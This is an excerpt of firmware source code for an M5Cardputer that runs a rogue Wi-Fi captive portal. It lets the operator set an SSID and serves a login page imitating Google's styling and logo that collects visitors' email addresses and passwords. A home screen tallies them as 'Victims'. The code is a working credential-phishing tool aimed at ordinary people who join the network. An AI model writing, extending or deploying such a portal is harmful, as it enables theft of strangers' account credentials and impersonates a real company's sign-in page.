...
void confirmOrTypeSSID() {
  ...
  while (!ssid_ok) {
    ...
    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      ...
      DISPLAY.fillRect(0, ssidTextCursorY - 10, DISPLAY.width(),
                       DISPLAY.width() - ssidTextCursorY, BLACK);
      DISPLAY.setCursor(0, ssidTextCursorY);
      DISPLAY.printf("%s", currentSSID.c_str());
    }
  }
...
void printHomeToScreen() {
  ...
  String totalCapturedCredentialsText =
      "Victims: " + String(totalCapturedCredentials);
...
String getHtmlContents(String body) {
  String html =
      ...
      "  <style>a:hover{ text-decoration: underline;} body{ font-family: "
      "Arial, sans-serif; align-items: center; justify-content: center; "
      "background-color: #FFFFFF;} input[type='text'], input[type='password']{ "
      "width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; "
      "border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: "
      "auto; padding: 20px;} .logo-container{ text-align: center; "
      "margin-bottom: 30px; display: flex; justify-content: center; "
      "align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; "
      "margin-right: 100px;} .company-name{ font-size: 42px; color: black; "
      "margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px "
      "solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px "
      "10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: "
      "28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: "
      "100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; "
      "margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: "
      "#1a73e8; color: white; border: none; padding: 12px 20px; border-radius: "
      "4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} "
      ".containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; "
      "font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ "
      "color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} "
      ".containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} "
      ".containerbtn{ padding: 30px 0px 25px 0px;} @media screen and "
      "(min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
      "</head>"
      "<body>"
      "  <div class='container'>"
      ...
      "      <center>"
      "        <div class='containerlogo'><svg viewBox='0 0 75 24' width='75' "
      "height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' "
      "class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 "
      "16.303c-1.33 "
...
String index_GET() {
  ...
  return getHtmlContents(
      "<center><div class='containertitle'>" + loginTitle +
      " </div><div class='containersubtitle'>" + loginSubTitle +
      " </div></center><form action='/post' id='login-form'><input "
      "name='email' class='input-field' type='text' placeholder='" +
      loginEmailPlaceholder +
      "' required><input name='password' class='input-field' type='password' "
      "placeholder='" +
      loginPasswordPlaceholder + "' required /><div class='containermsg'>" +
      loginMessage +
      "</div><div class='containerbtn'><button id=submitbtn class=submit-btn "
      "type=submit>" +
      loginButton + " </button></div></form>");
}
...
String ssid_GET() {
  return getHtmlContents(
      "<p>Set a new SSID for Captive Portal:</p><form action='/postssid' "
...
String ssid_POST() {
  ...
  printHomeToScreen();
  return getHtmlContents(
      "Captive Portal shutting down and restarting with SSID <b>" + ssid +
      "</b>. Please reconnect.");
}
